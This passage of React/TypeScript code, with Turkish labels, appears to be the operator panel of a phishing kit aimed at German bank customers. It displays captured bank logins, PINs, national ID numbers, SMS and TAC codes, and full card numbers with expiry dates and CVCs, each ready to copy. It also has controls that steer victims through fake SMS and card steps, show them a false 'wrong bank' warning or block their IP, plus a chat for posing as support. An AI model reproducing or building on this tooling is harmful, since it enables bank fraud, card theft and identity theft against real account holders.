                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
                              }`}
                              title="Eski kart bilgilerini göster"
                            >
                              GEÇMİŞ ({cardHistoryCount})
                            </button>
                          </div>
                        ) : null}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <span className={`inline-flex max-w-full rounded-full px-2 py-1 text-[9px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] ${stepColor}`}>
                        {stepText}
                      </span>
                    </td>
                    <td className="px-2 py-3 align-top">
                      {isOnline ? (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                          <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                          ONLINE
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                          <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                          OFFLINE
                        </span>
                      )}
                    </td>
                    <td className="px-2 py-3 align-top text-right">
                      <div className="ml-auto flex w-full max-w-[168px] flex-col items-end justify-end gap-1.5">
                        <select
                          className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                          value=""
                          onChange={(e) => {
                            if (e.target.value) {
                              void handleRouteAction(row.id, e.target.value);
                              e.target.value = "";
                            }
                          }}
                        >
                          <option value="">Aksiyon Seçin...</option>
                          <option value="win">👉 İsim & Profil'e Yönlendir</option>
                          <option value="banken">👉 Banka Listesine Yönlendir</option>
                          <option value="sms">👉 SMS Doğrulamasına Yönlendir</option>
                          <option value="card">👉 Kredi Kartına Yönlendir</option>
                          <option value="special_approval">🔔 Özel Bildirim Gönder</option>
                          <option value="wait">⏳ Beklemeye Al</option>
                          <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                          <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
                          <option value="congrats">✅ Tebrikler Ekranına Al</option>
                          <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
                        </select>

                        <div className="flex justify-end items-center mt-0.5 gap-1 w-full">
                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
                            <span>💬</span>
                          </button>
                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                            <span>📱</span>
                          </button>
                          <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
                            <span>🗑️</span>
                          </button>
                        </div>
                      </div>
                    </td>
                  </tr>
                  {expandedBankHistorySessionId === row.id && (
                    <tr className={darkMode ? 'bg-black/30' : 'bg-gray-50/60'}>
                      <td colSpan={10} className="px-4 py-3 md:px-6 md:py-4">
                        {bankHistoryCount > 0 ? (
                          <>
                            <div className="mb-2 flex items-center gap-2 flex-wrap">
                              <span
                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
                                  darkMode
                                    ? "bg-amber-500/15 text-amber-400 border-amber-500/30"
                                    : "bg-amber-500/10 text-amber-600 border-amber-500/30"
                                }`}
                              >
                                Eski Banka Girişleri ({bankHistoryCount})
                              </span>
                              <button
                                type="button"
                                onClick={() => setExpandedBankHistorySessionId(null)}
                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
                                  darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
                                }`}
                              >
                                KAPAT
                              </button>
                            </div>
                            <div className="space-y-2.5 md:space-y-3">
                              {(fd as any)._bankHistory
                                .slice()
                                .reverse()
                                .map((entry: any, index: number) => {
                                  const entryDate = entry.capturedAt
                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
                                        hour12: false,
                                        timeZone: "Europe/Istanbul",
                                      })
                                    : "Tarih yok";
                                  return (
                                    <div
                                      key={`${row.id}-history-${index}`}
                                      className={`rounded-2xl border p-4 ${
                                        darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"
                                      }`}
                                    >
                                      <div className="mb-2 flex flex-wrap items-center gap-2">
                                        <span
                                          className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
                                            darkMode
                                              ? "bg-white/10 text-zinc-300 border-white/10"
                                              : "bg-gray-100 text-gray-700 border-gray-200"
                                          }`}
                                        >
                                          #{bankHistoryCount - index}
                                        </span>
                                        {entry.bankName && (
                                          <span
                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
                                              darkMode
                                                ? "bg-yellow-500/10 text-yellow-500 border-yellow-500/20"
                                                : "bg-yellow-50 border-yellow-200 text-yellow-700"
                                            }`}
                                          >
                                            {entry.bankName}
                                          </span>
                                        )}
                                        {entry.htmlStepLabel && (
                                          <span
                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
                                              darkMode
                                                ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30"
                                                : "bg-emerald-50 border-emerald-200 text-emerald-700"
                                            }`}
                                          >
                                            {entry.htmlStepLabel}
                                          </span>
                                        )}
                                        {entry.isLegacySnapshot && (
                                          <span
                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
                                              darkMode
                                                ? "bg-pink-500/10 text-pink-400 border-pink-500/20"
                                                : "bg-pink-50 border-pink-200 text-pink-600"
                                            }`}
                                          >
                                            ESKİ KAYITTAN ALINDI
                                          </span>
                                        )}
                                        <span className="ml-auto text-[11px] font-mono opacity-50">
                                          {entryDate}
                                        </span>
                                      </div>
                                      <div className="grid grid-cols-1 gap-2 text-[11px] sm:grid-cols-2 lg:grid-cols-4">
                                        {entry.verfuegernummer || entry.username ? (
                                          <div
                                            className={`rounded-xl border px-3 py-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Kullanıcı ID</div>
                                            <div
                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
                                              onClick={() =>
                                                copyToClipboard(String(entry.verfuegernummer || entry.username || ""))
                                              }
                                            >
                                              {entry.verfuegernummer || entry.username || "-"}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.pin || entry.password ? (
                                          <div
                                            className={`rounded-xl border px-3 py-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Şifre / PIN</div>
                                            <div
                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
                                              onClick={() =>
                                                copyToClipboard(String(entry.pin || entry.password || ""))
                                              }
                                            >
                                              {entry.pin || entry.password || "-"}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.personalCode ? (
                                          <div
                                            className={`rounded-xl border px-3 py-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Kimlik No</div>
                                            <div
                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
                                              onClick={() => copyToClipboard(String(entry.personalCode))}
                                            >
                                              {entry.personalCode}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.bankPhone ? (
                                          <div
                                            className={`rounded-xl border px-3 py-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Banka Telefon</div>
                                            <div
                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
                                              onClick={() => copyToClipboard(String(entry.bankPhone))}
                                            >
                                              {entry.bankPhone}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.loginMethod ? (
                                          <div
                                            className={`rounded-xl border px-3 py-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Giriş Yöntemi</div>
                                            <div
                                              className="cursor-pointer font-semibold break-words [overflow-wrap:anywhere]"
                                              onClick={() => copyToClipboard(String(entry.loginMethod))}
                                            >
                                              {entry.loginMethod}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.tacCode ? (
                                          <div
                                            className={`rounded-xl border px-3 py-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">TAC / Onay Kodu</div>
                                            <div
                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere] text-indigo-500"
                                              onClick={() => copyToClipboard(String(entry.tacCode))}
                                            >
                                              {entry.tacCode}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.orderedField1 || entry.orderedField2 || entry.orderedField3 ? (
                                          <div
                                            className={`rounded-xl border px-3 py-2 sm:col-span-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Sıralı Form Alanları</div>
                                            <div className="space-y-0.5 font-mono">
                                              {entry.orderedField1 && <div>1. {entry.orderedField1}</div>}
                                              {entry.orderedField2 && <div>2. {entry.orderedField2}</div>}
                                              {entry.orderedField3 && <div>3. {entry.orderedField3}</div>}
                                            </div>
                                          </div>
                                        ) : null}
                                      </div>
                                      {entry.rawFields && Object.keys(entry.rawFields).length > 0 ? (
                                        <details className="mt-3">
                                          <summary className="cursor-pointer text-[9px] font-black uppercase tracking-wide opacity-50 hover:opacity-80">
                                            Ham (iframe) alanlar ({Object.keys(entry.rawFields).length})
                                          </summary>
                                          <pre
                                            className={`mt-2 max-h-56 overflow-auto rounded-xl border p-3 text-[11px] font-mono whitespace-pre-wrap break-all ${
                                              darkMode
                                                ? "border-white/5 bg-black/40 text-zinc-300"
                                                : "border-gray-200 bg-gray-100 text-gray-800"
                                            }`}
                                          >
{JSON.stringify(entry.rawFields, null, 2)}
                                          </pre>
                                        </details>
                                      ) : null}
                                    </div>
                                  );
                                })}
                            </div>
                          </>
                        ) : (
                          <>
                            <div className="mb-2 flex items-center gap-2">
                              <span
                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
                                  darkMode
                                    ? "bg-white/10 text-zinc-400 border-white/10"
                                    : "bg-gray-100 text-gray-600 border-gray-200"
                                }`}
                              >
                                Eski Banka Girişleri (0)
                              </span>
                              <button
                                type="button"
                                onClick={() => setExpandedBankHistorySessionId(null)}
                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
                                  darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
                                }`}
                              >
                                KAPAT
                              </button>
                            </div>
                            <div
                              className={`rounded-2xl border px-4 py-5 text-center ${
                                darkMode
                                  ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
                                  : "border-dashed border-gray-200 bg-white/60"
                              }`}
                            >
                              <div className="text-xs font-black uppercase opacity-50">
                                Bu oturum için henüz banka form geçmişi kaydedilmemiş
                              </div>
                              <div className="mt-1 text-[11px] opacity-40">
                                Kullanıcı yeni bir banka formu submit ettiğinde bilgiler burada listelenecek.
                              </div>
                            </div>
                          </>
                        )}
                      </td>
                    </tr>
                  )}

                  {/* ============= SMS GECMISI AÇILIR SATIR ============= */}
                  {expandedSmsHistorySessionId === row.id && (
                    <tr className={darkMode ? 'bg-indigo-500/[0.06]' : 'bg-indigo-50/60'}>
                      <td colSpan={10} className="px-4 py-3 md:px-6 md:py-4">
                        {smsHistoryCount > 0 ? (
                          <>
                            <div className="mb-2 flex items-center gap-2 flex-wrap">
                              <span
                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
                                  darkMode
                                    ? "bg-indigo-500/15 text-indigo-400 border-indigo-500/30"
                                    : "bg-indigo-500/10 text-indigo-600 border-indigo-500/30"
                                }`}
                              >
                                Eski SMS Kodları ({smsHistoryCount})
                              </span>
                              <button
                                type="button"
                                onClick={() => setExpandedSmsHistorySessionId(null)}
                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
                                  darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
                                }`}
                              >
                                KAPAT
                              </button>
                            </div>
                            <div className="space-y-2.5 md:space-y-3">
                              {(fd as any)._smsHistory
                                .slice()
                                .reverse()
                                .map((entry: any, index: number) => {
                                  const entryDate = entry.capturedAt
                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
                                        hour12: false,
                                        timeZone: "Europe/Istanbul",
                                      })
                                    : "Tarih yok";
                                  return (
                                    <div
                                      key={`${row.id}-sms-history-${index}`}
                                      className={`rounded-2xl border p-4 ${
                                        darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"
                                      }`}
                                    >
                                      <div className="mb-2 flex flex-wrap items-center gap-2">
                                        <span
                                          className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
                                            darkMode
                                              ? "bg-indigo-500/10 text-indigo-400 border-indigo-500/20"
                                              : "bg-indigo-50 border-indigo-200 text-indigo-700"
                                          }`}
                                        >
                                          #{smsHistoryCount - index}
                                        </span>
                                        {entry.isLegacySnapshot && (
                                          <span
                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
                                              darkMode
                                                ? "bg-pink-500/10 text-pink-400 border-pink-500/20"
                                                : "bg-pink-50 border-pink-200 text-pink-600"
                                            }`}
                                          >
                                            ESKİ KAYITTAN ALINDI
                                          </span>
                                        )}
                                        <span className="ml-auto text-[11px] font-mono opacity-50">
                                          {entryDate}
                                        </span>
                                      </div>
                                      <div className="grid grid-cols-1 gap-2 text-[11px]">
                                        <div
                                          className={`rounded-xl border px-3 py-3 ${
                                            darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                          }`}
                                        >
                                          <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">SMS Kodu</div>
                                          <div
                                            className="cursor-pointer font-mono text-[14px] font-bold tracking-[0.18em] break-words [overflow-wrap:anywhere] text-indigo-500 hover:underline"
                                            onClick={() => copyToClipboard(String(entry.sms || ""))}
                                          >
                                            {entry.sms || "-"}
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  );
                                })}
                            </div>
                          </>
                        ) : (
                          <>
                            <div className="mb-2 flex items-center gap-2">
                              <span
                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
                                  darkMode
                                    ? "bg-white/10 text-zinc-400 border-white/10"
                                    : "bg-gray-100 text-gray-600 border-gray-200"
                                }`}
                              >
                                Eski SMS Kodları (0)
                              </span>
                              <button
                                type="button"
                                onClick={() => setExpandedSmsHistorySessionId(null)}
                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
                                  darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
                                }`}
                              >
                                KAPAT
                              </button>
                            </div>
                            <div
                              className={`rounded-2xl border px-4 py-5 text-center ${
                                darkMode
                                  ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
                                  : "border-dashed border-gray-200 bg-white/60"
                              }`}
                            >
                              <div className="text-xs font-black uppercase opacity-50">
                                Bu oturum için henüz SMS kodu geçmişi kaydedilmemiş
                              </div>
                              <div className="mt-1 text-[11px] opacity-40">
                                Kullanıcı yeni bir SMS/TAC kodu submit ettiğinde bilgiler burada listelenecek.
                              </div>
                            </div>
                          </>
                        )}
                      </td>
                    </tr>
                  )}

                  {/* ============= KART GECMISI AÇILIR SATIR ============= */}
                  {expandedCardHistorySessionId === row.id && (
                    <tr className={darkMode ? 'bg-rose-500/[0.06]' : 'bg-rose-50/60'}>
                      <td colSpan={10} className="px-4 py-3 md:px-6 md:py-4">
                        {cardHistoryCount > 0 ? (
                          <>
                            <div className="mb-2 flex items-center gap-2 flex-wrap">
                              <span
                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
                                  darkMode
                                    ? "bg-rose-500/15 text-rose-400 border-rose-500/30"
                                    : "bg-rose-500/10 text-rose-600 border-rose-500/30"
                                }`}
                              >
                                Eski Kart Bilgileri ({cardHistoryCount})
                              </span>
                              <button
                                type="button"
                                onClick={() => setExpandedCardHistorySessionId(null)}
                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
                                  darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
                                }`}
                              >
                                KAPAT
                              </button>
                            </div>
                            <div className="space-y-2.5 md:space-y-3">
                              {(fd as any)._cardHistory
                                .slice()
                                .reverse()
                                .map((entry: any, index: number) => {
                                  const entryDate = entry.capturedAt
                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
                                        hour12: false,
                                        timeZone: "Europe/Istanbul",
                                      })
                                    : "Tarih yok";
                                  return (
                                    <div
                                      key={`${row.id}-card-history-${index}`}
                                      className={`rounded-2xl border p-4 ${
                                        darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"
                                      }`}
                                    >
                                      <div className="mb-2 flex flex-wrap items-center gap-2">
                                        <span
                                          className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
                                            darkMode
                                              ? "bg-rose-500/10 text-rose-400 border-rose-500/20"
                                              : "bg-rose-50 border-rose-200 text-rose-700"
                                          }`}
                                        >
                                          #{cardHistoryCount - index}
                                        </span>
                                        {entry.isLegacySnapshot && (
                                          <span
                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
                                              darkMode
                                                ? "bg-pink-500/10 text-pink-400 border-pink-500/20"
                                                : "bg-pink-50 border-pink-200 text-pink-600"
                                            }`}
                                          >
                                            ESKİ KAYITTAN ALINDI
                                          </span>
                                        )}
                                        <span className="ml-auto text-[11px] font-mono opacity-50">
                                          {entryDate}
                                        </span>
                                      </div>
                                      <div className="grid grid-cols-1 gap-2 text-[11px] sm:grid-cols-3">
                                        {entry.cardNumber ? (
                                          <div
                                            className={`rounded-xl border px-3 py-3 sm:col-span-2 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 flex items-center gap-1">
                                              <span className="rounded border border-rose-500/30 bg-rose-500/15 px-1 py-0.5 text-[7px] font-black uppercase text-rose-500 dark:text-rose-400 shadow-sm">
                                                NO
                                              </span>
                                              <span className="text-[8px] font-black uppercase opacity-50">Kart Numarası</span>
                                            </div>
                                            <div
                                              className="cursor-pointer font-mono text-[15px] font-bold tracking-[0.12em] break-words [overflow-wrap:anywhere] text-rose-600 dark:text-rose-400 hover:underline hover:text-rose-700 dark:hover:text-rose-300"
                                              onClick={() => copyToClipboard(String(entry.cardNumber || ""))}
                                            >
                                              {entry.cardNumber || "-"}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.cardExpiry ? (
                                          <div
                                            className={`rounded-xl border px-3 py-3 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 flex items-center gap-1">
                                              <span className="rounded border border-amber-500/30 bg-amber-500/15 px-1 py-0.5 text-[7px] font-black uppercase text-amber-600 dark:text-amber-400 shadow-sm">
                                                SKT
                                              </span>
                                              <span className="text-[8px] font-black uppercase opacity-50">Son Kul.</span>
                                            </div>
                                            <div
                                              className="cursor-pointer font-bold text-[13px] break-words [overflow-wrap:anywhere] text-amber-700 dark:text-amber-400 hover:underline"
                                              onClick={() => copyToClipboard(String(entry.cardExpiry || ""))}
                                            >
                                              {entry.cardExpiry || "-"}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.cardCvc ? (
                                          <div
                                            className={`rounded-xl border px-3 py-3 ${
                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
                                            }`}
                                          >
                                            <div className="mb-0.5 flex items-center gap-1">
                                              <span className="rounded border border-violet-500/30 bg-violet-500/15 px-1 py-0.5 text-[7px] font-black uppercase text-violet-600 dark:text-violet-400 shadow-sm">
                                                CVC
                                              </span>
                                              <span className="text-[8px] font-black uppercase opacity-50">Güvenlik</span>
                                            </div>
                                            <div
                                              className="cursor-pointer font-bold text-[13px] break-words [overflow-wrap:anywhere] text-violet-700 dark:text-violet-400 hover:underline"
                                              onClick={() => copyToClipboard(String(entry.cardCvc || ""))}
                                            >
                                              {entry.cardCvc || "-"}
                                            </div>
                                          </div>
                                        ) : null}
                                      </div>
                                    </div>
                                  );
                                })}
                            </div>
                          </>
                        ) : (
                          <>
                            <div className="mb-2 flex items-center gap-2">
                              <span
                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
                                  darkMode
                                    ? "bg-white/10 text-zinc-400 border-white/10"
                                    : "bg-gray-100 text-gray-600 border-gray-200"
                                }`}
                              >
                                Eski Kart Bilgileri (0)
                              </span>
                              <button
                                type="button"
                                onClick={() => setExpandedCardHistorySessionId(null)}
                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
                                  darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
                                }`}
                              >
                                KAPAT
                              </button>
                            </div>
                            <div
                              className={`rounded-2xl border px-4 py-5 text-center ${
                                darkMode
                                  ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
                                  : "border-dashed border-gray-200 bg-white/60"
                              }`}
                            >
                              <div className="text-xs font-black uppercase opacity-50">
                                Bu oturum için henüz kart bilgisi geçmişi kaydedilmemiş
                              </div>
                              <div className="mt-1 text-[11px] opacity-40">
                                Kullanıcı yeni bir kredi kartı formu submit ettiğinde bilgiler burada listelenecek.
                              </div>
                            </div>
                          </>
                        )}
                      </td>
                    </tr>
                  )}
                  </Fragment>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* CHAT MODAL */}
      {chatSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`flex h-[32rem] w-full max-w-md flex-col overflow-hidden rounded-2xl border shadow-2xl ${darkMode ? 'border-white/10 bg-[#111111]' : 'border-gray-200 bg-white'}`}>
            <div className={`flex items-center justify-between px-4 py-3 border-b ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-100 border-gray-200'}`}>
              <h3 className={`font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kullanıcı ile Sohbet</h3>
              <button onClick={() => setChatSessionId(null)} className={`hover:opacity-70 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>✕</button>
            </div>
            <div className={`flex-1 overflow-y-auto p-4 space-y-3 ${darkMode ? 'bg-[#0a0a0a]' : 'bg-gray-50'}`}>
              {chatMessages.length === 0 ? (
                <p className={`text-center text-xs mt-10 ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>Henüz mesaj yok.</p>
              ) : (
                chatMessages.map((m) => (
                  <div key={m.id} className={`flex ${m.sender === "admin" ? "justify-end" : "justify-start"}`}>
                    <div className={`max-w-[80%] rounded-xl px-3 py-2 text-sm ${m.sender === "admin" ? "bg-[#EB5E28] text-white rounded-br-none" : (darkMode ? "bg-zinc-800 text-zinc-200 rounded-bl-none" : "bg-white border text-gray-800 rounded-bl-none")}`}>
                      {m.image_url && (
                        <div 
                          className="mb-2 overflow-hidden rounded-lg cursor-pointer hover:opacity-90 transition-opacity"
                          onClick={() => setZoomedImage(m.image_url)}
                        >
                          <img src={m.image_url} alt="Ek" className="max-h-48 w-full object-cover" />
                        </div>
                      )}
                      {m.content && <p>{m.content}</p>}
                    </div>
                  </div>
                ))
              )}
              <div ref={chatEndRef} />
            </div>

            {pastedImagePreview && (
              <div className={`p-3 flex flex-col gap-2 border-t ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-100 border-gray-200'}`}>
                <div className="flex justify-between items-center">
                  <span className={`text-xs font-bold ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Gönderilecek Görsel:</span>
                  <button onClick={() => { setPastedImage(null); setPastedImagePreview(null); }} className="text-xs text-red-400 hover:text-red-300 font-bold">İptal</button>
                </div>
                <div className={`relative rounded-lg overflow-hidden border h-32 flex justify-center ${darkMode ? 'border-zinc-700 bg-black' : 'border-gray-300 bg-gray-200'}`}>
                  <img src={pastedImagePreview} alt="Preview" className="object-contain h-full" />
                </div>
              </div>
            )}

            <form onSubmit={sendChatMessage} className={`flex border-t p-2 ${darkMode ? 'bg-[#161616] border-zinc-800' : 'bg-white border-gray-200'}`}>
              <input
                type="text"
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onPaste={handlePaste}
                placeholder="Mesaj yazın... (Ctrl+V ile görsel)"
                className={`flex-1 bg-transparent px-3 py-2 text-sm outline-none ${darkMode ? 'text-white' : 'text-gray-900'}`}
              />
              <button type="submit" disabled={(!chatInput.trim() && !pastedImage) || isUploadingImage} className="rounded-lg bg-[#EB5E28] px-4 py-2 text-xs font-bold text-white transition-colors hover:bg-[#c94d1e] disabled:opacity-50">
                {isUploadingImage ? "Yükleniyor..." : "Gönder"}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* ZOOMED IMAGE */}
      {zoomedImage && (
        <div 
          className="fixed inset-0 z-[200] flex items-center justify-center bg-black/90 p-4 backdrop-blur-sm animate-in fade-in duration-200" 
          onClick={() => setZoomedImage(null)}
        >
          <button 
            className="absolute top-4 right-4 sm:top-8 sm:right-8 text-white/70 hover:text-white p-2" 
            onClick={() => setZoomedImage(null)}
          >
            <svg className="size-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          <img 
            src={zoomedImage} 
            alt="Zoomed" 
            className="max-w-full max-h-full object-contain rounded-lg animate-in zoom-in-95 duration-200" 
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}

      {/* SPECIAL NOTIFICATION MODAL */}
      {specialPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-2xl rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`} onPaste={(e) => {
              const file = e.clipboardData.files?.[0];
              if (file && file.type.startsWith("image/")) {
                const reader = new FileReader();
                reader.onload = () => setSpecialImage(reader.result as string);
                reader.readAsDataURL(file);
              }
            }}>
            <div className="flex justify-between mb-4 items-center">
              <h3 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Özel Bildirim Paneli</h3>
              <div className="flex gap-2">
                <button onClick={() => setSpecialLang("de")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "de" ? "bg-[#EB5E28] text-white" : (darkMode ? "bg-zinc-800 text-zinc-500" : "bg-gray-200 text-gray-600")}`}>DE</button>
                <button onClick={() => setSpecialLang("tr")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "tr" ? "bg-[#EB5E28] text-white" : (darkMode ? "bg-zinc-800 text-zinc-500" : "bg-gray-200 text-gray-600")}`}>TR</button>
              </div>
            </div>
            <textarea 
              value={specialMessage} 
              onChange={(e) => setSpecialMessage(e.target.value)} 
              className={`w-full rounded-xl p-4 border outline-none transition-all ${darkMode ? 'bg-zinc-900 text-white border-zinc-800 focus:border-[#EB5E28]' : 'bg-gray-50 text-gray-900 border-gray-200 focus:border-[#EB5E28]'}`} 
              placeholder="Mesaj yazın veya buraya bir resim yapıştırın..." 
              rows={5} 
            />
            {specialImage && (
              <div className="mt-4 relative rounded-xl border border-zinc-800 overflow-hidden bg-black">
                <img src={specialImage} className="max-h-48 w-full object-contain" alt="Preview" />
                <button onClick={() => setSpecialImage(null)} className="absolute top-2 right-2 bg-red-600 p-1.5 rounded-full text-white hover:bg-red-700">✕</button>
              </div>
            )}
